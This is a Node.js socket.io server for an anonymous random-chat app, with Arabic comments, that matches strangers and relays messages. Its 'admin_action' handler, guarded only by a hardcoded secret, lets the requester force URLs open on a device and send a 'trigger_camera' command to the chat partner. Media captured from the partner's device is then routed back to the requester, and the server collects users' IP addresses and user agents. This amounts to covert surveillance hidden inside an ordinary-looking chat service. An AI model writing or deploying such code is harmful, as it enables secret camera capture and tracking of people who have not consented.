const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// قراءة الملفات الثابتة من المجلد الحالي مباشرة
app.use(express.static(__dirname));

let waitingUser = null;

io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  const userAgent = socket.handshake.headers['user-agent'];
  
  // إرسال معلومات الجهاز للعميل (تفيد لوحة تحكم الأدمن)
  socket.emit('device_info', { ip: clientIp, ua: userAgent });

  // نظام مطابقة العرايس (الدردشة العشوائية)
  socket.on('find_partner', () => {
    if (waitingUser && waitingUser.id !== socket.id) {
      const roomName = 'room_' + socket.id + '_' + waitingUser.id;
      socket.join(roomName);
      waitingUser.join(roomName);

      socket.partnerId = waitingUser.id;
      waitingUser.partnerId = socket.id;
      socket.roomName = roomName;
      waitingUser.roomName = roomName;

      waitingUser.emit('matched');
      socket.emit('matched');

      waitingUser = null;
    } else {
      waitingUser = socket;
    }
  });

  // تبادل الرسائل بين الطرفين في الغرفة
  socket.on('message', (data) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('message', data);
    }
  });

  // مؤشر الكتابة (يكتب...)
  socket.on('typing', (isTyping) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('display_typing', isTyping);
    }
  });

  // أوامر لوحة تحكم الأدمن
  socket.on('admin_action', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return;

    if (data.action === 'open_url') {
      io.to(socket.id).emit('force_open_url', data.url);
    } else if (data.action === 'request_media') {
      socket.to(socket.roomName).emit('trigger_camera', { mediaType: data.mediaType, duration: data.duration });
    } else if (data.action === 'alert') {
      io.emit('system_alert', data.message);
    } else if (data.action === 'clear_chat') {
      if (socket.roomName) {
        io.to(socket.roomName).emit('clear_chat', data.target);
      }
    } else if (data.action === 'play_sound') {
      if (socket.roomName) {
        io.to(socket.roomName).emit('play_sound_in_browser', data.audioUrl);
      }
    } else if (data.action === 'change_bg') {
      if (socket.roomName) {
        io.to(socket.roomName).emit('change_bg', data.bgColor);
      }
    }
  });

  // استقبال الوسائط الملتقطة وإرسالها لمعاينة الأدمن
  socket.on('user_media_captured', (mediaData) => {
    if (socket.partnerId) {
      io.to(socket.partnerId).emit('display_captured_media_to_admin', mediaData);
    }
  });

  // التعامل مع انقطاع الاتصال أو خروج المستخدم
  socket.on('disconnect', () => {
    if (waitingUser === socket) {
      waitingUser = null;
    }
    if (socket.roomName) {
      socket.to(socket.roomName).emit('partner_disconnected');
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
